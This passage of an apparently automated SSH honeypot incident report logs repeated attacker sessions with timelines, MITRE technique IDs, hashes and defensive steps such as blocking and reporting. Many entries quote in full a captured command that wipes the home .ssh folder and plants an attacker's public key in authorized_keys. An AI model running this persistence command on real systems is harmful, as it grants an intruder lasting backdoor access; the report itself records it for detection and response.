| `2026-05-05 13:04:37` | `cowrie.command.failed` |
| `2026-05-05 13:04:38` | `cowrie.log.closed` |
| `2026-05-05 13:04:38` | `cowrie.session.params` |
| `2026-05-05 13:04:38` | `cowrie.command.input` |
| `2026-05-05 13:04:39` | `cowrie.session.file_download` |
| `2026-05-05 13:04:39` | `cowrie.log.closed` |
| `2026-05-05 13:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-208500da9680

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:04 |
| **Last Seen** | 2026-05-05 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:04:42` | `cowrie.session.connect` |
| `2026-05-05 13:04:42` | `cowrie.client.version` |
| `2026-05-05 13:04:42` | `cowrie.client.kex` |
| `2026-05-05 13:04:43` | `cowrie.login.success` |
| `2026-05-05 13:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e156471ea3a6

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:05 |
| **Last Seen** | 2026-05-05 13:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:05:35` | `cowrie.session.connect` |
| `2026-05-05 13:05:35` | `cowrie.client.version` |
| `2026-05-05 13:05:35` | `cowrie.client.kex` |
| `2026-05-05 13:05:36` | `cowrie.login.success` |
| `2026-05-05 13:05:37` | `cowrie.session.params` |
| `2026-05-05 13:05:37` | `cowrie.command.input` |
| `2026-05-05 13:05:37` | `cowrie.command.failed` |
| `2026-05-05 13:05:38` | `cowrie.log.closed` |
| `2026-05-05 13:05:38` | `cowrie.session.params` |
| `2026-05-05 13:05:38` | `cowrie.command.input` |
| `2026-05-05 13:05:39` | `cowrie.session.file_download` |
| `2026-05-05 13:05:39` | `cowrie.log.closed` |
| `2026-05-05 13:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-365c9cedb2cc

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:05 |
| **Last Seen** | 2026-05-05 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:05:42` | `cowrie.session.connect` |
| `2026-05-05 13:05:42` | `cowrie.client.version` |
| `2026-05-05 13:05:42` | `cowrie.client.kex` |
| `2026-05-05 13:05:43` | `cowrie.login.success` |
| `2026-05-05 13:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ef1937b1dd

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:06 |
| **Last Seen** | 2026-05-05 13:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:06:34` | `cowrie.session.connect` |
| `2026-05-05 13:06:34` | `cowrie.client.version` |
| `2026-05-05 13:06:34` | `cowrie.client.kex` |
| `2026-05-05 13:06:36` | `cowrie.login.success` |
| `2026-05-05 13:06:36` | `cowrie.session.params` |
| `2026-05-05 13:06:36` | `cowrie.command.input` |
| `2026-05-05 13:06:36` | `cowrie.command.failed` |
| `2026-05-05 13:06:36` | `cowrie.log.closed` |
| `2026-05-05 13:06:37` | `cowrie.session.params` |
| `2026-05-05 13:06:37` | `cowrie.command.input` |
| `2026-05-05 13:06:37` | `cowrie.session.file_download` |
| `2026-05-05 13:06:37` | `cowrie.log.closed` |
| `2026-05-05 13:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eeeb70da149

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:06 |
| **Last Seen** | 2026-05-05 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:06:41` | `cowrie.session.connect` |
| `2026-05-05 13:06:41` | `cowrie.client.version` |
| `2026-05-05 13:06:41` | `cowrie.client.kex` |
| `2026-05-05 13:06:42` | `cowrie.login.success` |
| `2026-05-05 13:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae0d40e8f9f

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:07 |
| **Last Seen** | 2026-05-05 13:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:07:35` | `cowrie.session.connect` |
| `2026-05-05 13:07:35` | `cowrie.client.version` |
| `2026-05-05 13:07:35` | `cowrie.client.kex` |
| `2026-05-05 13:07:36` | `cowrie.login.success` |
| `2026-05-05 13:07:37` | `cowrie.session.params` |
| `2026-05-05 13:07:37` | `cowrie.command.input` |
| `2026-05-05 13:07:37` | `cowrie.command.failed` |
| `2026-05-05 13:07:37` | `cowrie.log.closed` |
| `2026-05-05 13:07:38` | `cowrie.session.params` |
| `2026-05-05 13:07:38` | `cowrie.command.input` |
| `2026-05-05 13:07:38` | `cowrie.session.file_download` |
| `2026-05-05 13:07:38` | `cowrie.log.closed` |
| `2026-05-05 13:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40bf773fdfe6

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:07 |
| **Last Seen** | 2026-05-05 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:07:42` | `cowrie.session.connect` |
| `2026-05-05 13:07:42` | `cowrie.client.version` |
| `2026-05-05 13:07:42` | `cowrie.client.kex` |
| `2026-05-05 13:07:43` | `cowrie.login.success` |
| `2026-05-05 13:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3936672456f1

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:08 |
| **Last Seen** | 2026-05-05 13:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:08:33` | `cowrie.session.connect` |
| `2026-05-05 13:08:33` | `cowrie.client.version` |
| `2026-05-05 13:08:33` | `cowrie.client.kex` |
| `2026-05-05 13:08:34` | `cowrie.login.success` |
| `2026-05-05 13:08:35` | `cowrie.session.params` |
| `2026-05-05 13:08:35` | `cowrie.command.input` |
| `2026-05-05 13:08:35` | `cowrie.command.failed` |
| `2026-05-05 13:08:35` | `cowrie.log.closed` |
| `2026-05-05 13:08:36` | `cowrie.session.params` |
| `2026-05-05 13:08:36` | `cowrie.command.input` |
| `2026-05-05 13:08:36` | `cowrie.session.file_download` |
| `2026-05-05 13:08:36` | `cowrie.log.closed` |
| `2026-05-05 13:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470cc2aad366

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:08 |
| **Last Seen** | 2026-05-05 13:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:08:39` | `cowrie.session.connect` |
| `2026-05-05 13:08:39` | `cowrie.client.version` |
| `2026-05-05 13:08:40` | `cowrie.client.kex` |
| `2026-05-05 13:08:41` | `cowrie.login.success` |
| `2026-05-05 13:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b6980c3a89

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:09 |
| **Last Seen** | 2026-05-05 13:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:09:32` | `cowrie.session.connect` |
| `2026-05-05 13:09:32` | `cowrie.client.version` |
| `2026-05-05 13:09:32` | `cowrie.client.kex` |
| `2026-05-05 13:09:33` | `cowrie.login.success` |
| `2026-05-05 13:09:34` | `cowrie.session.params` |
| `2026-05-05 13:09:34` | `cowrie.command.input` |
| `2026-05-05 13:09:34` | `cowrie.command.failed` |
| `2026-05-05 13:09:34` | `cowrie.log.closed` |
| `2026-05-05 13:09:35` | `cowrie.session.params` |
| `2026-05-05 13:09:35` | `cowrie.command.input` |
| `2026-05-05 13:09:35` | `cowrie.session.file_download` |
| `2026-05-05 13:09:35` | `cowrie.log.closed` |
| `2026-05-05 13:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdf4a4601bef

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:09 |
| **Last Seen** | 2026-05-05 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:09:38` | `cowrie.session.connect` |
| `2026-05-05 13:09:38` | `cowrie.client.version` |
| `2026-05-05 13:09:38` | `cowrie.client.kex` |
| `2026-05-05 13:09:40` | `cowrie.login.success` |
| `2026-05-05 13:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9aee8d8c530

| Field | Detail |
|---|---|
| **Source IP** | `117.176.220[.]76` |
| **First Seen** | 2026-05-05 13:10 |
| **Last Seen** | 2026-05-05 13:11 |
| **Session Duration** | 60s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:10:14` | `cowrie.session.connect` |
| `2026-05-05 13:10:14` | `cowrie.client.version` |
| `2026-05-05 13:10:14` | `cowrie.client.kex` |
| `2026-05-05 13:10:14` | `cowrie.login.success` |
| `2026-05-05 13:11:14` | `cowrie.session.file_upload` |
| `2026-05-05 13:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.176.220[.]76` to AbuseIPDB if not already reported
- [ ] Block `117.176.220[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ef0ec7c642a

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:11 |
| **Last Seen** | 2026-05-05 13:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:11:37` | `cowrie.session.connect` |
| `2026-05-05 13:11:37` | `cowrie.client.version` |
| `2026-05-05 13:11:37` | `cowrie.client.kex` |
| `2026-05-05 13:11:38` | `cowrie.login.success` |
| `2026-05-05 13:11:39` | `cowrie.session.params` |
| `2026-05-05 13:11:39` | `cowrie.command.input` |
| `2026-05-05 13:11:39` | `cowrie.command.failed` |
| `2026-05-05 13:11:39` | `cowrie.log.closed` |
| `2026-05-05 13:11:40` | `cowrie.session.params` |
| `2026-05-05 13:11:40` | `cowrie.command.input` |
| `2026-05-05 13:11:40` | `cowrie.session.file_download` |
| `2026-05-05 13:11:40` | `cowrie.log.closed` |
| `2026-05-05 13:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43b354bba269

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:11 |
| **Last Seen** | 2026-05-05 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:11:43` | `cowrie.session.connect` |
| `2026-05-05 13:11:43` | `cowrie.client.version` |
| `2026-05-05 13:11:44` | `cowrie.client.kex` |
| `2026-05-05 13:11:45` | `cowrie.login.success` |
| `2026-05-05 13:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7cc8f045164

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:12 |
| **Last Seen** | 2026-05-05 13:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:12:40` | `cowrie.session.connect` |
| `2026-05-05 13:12:40` | `cowrie.client.version` |
| `2026-05-05 13:12:41` | `cowrie.client.kex` |
| `2026-05-05 13:12:42` | `cowrie.login.success` |
| `2026-05-05 13:12:42` | `cowrie.session.params` |
| `2026-05-05 13:12:42` | `cowrie.command.input` |
| `2026-05-05 13:12:42` | `cowrie.command.failed` |
| `2026-05-05 13:12:43` | `cowrie.log.closed` |
| `2026-05-05 13:12:43` | `cowrie.session.params` |
| `2026-05-05 13:12:43` | `cowrie.command.input` |
| `2026-05-05 13:12:44` | `cowrie.session.file_download` |
| `2026-05-05 13:12:44` | `cowrie.log.closed` |
| `2026-05-05 13:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-060fdfe0d57c

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:12 |
| **Last Seen** | 2026-05-05 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:12:47` | `cowrie.session.connect` |
| `2026-05-05 13:12:47` | `cowrie.client.version` |
| `2026-05-05 13:12:47` | `cowrie.client.kex` |
| `2026-05-05 13:12:48` | `cowrie.login.success` |
| `2026-05-05 13:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3f2d68223c4

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:24 |
| **Last Seen** | 2026-05-05 15:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:24:33` | `cowrie.session.connect` |
| `2026-05-05 15:24:33` | `cowrie.client.version` |
| `2026-05-05 15:24:33` | `cowrie.client.kex` |
| `2026-05-05 15:24:33` | `cowrie.login.success` |
| `2026-05-05 15:24:33` | `cowrie.session.params` |
| `2026-05-05 15:24:33` | `cowrie.command.input` |
| `2026-05-05 15:24:33` | `cowrie.command.failed` |
| `2026-05-05 15:24:33` | `cowrie.log.closed` |
| `2026-05-05 15:24:34` | `cowrie.session.params` |
| `2026-05-05 15:24:34` | `cowrie.command.input` |
| `2026-05-05 15:24:34` | `cowrie.session.file_download` |
| `2026-05-05 15:24:34` | `cowrie.log.closed` |
| `2026-05-05 15:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
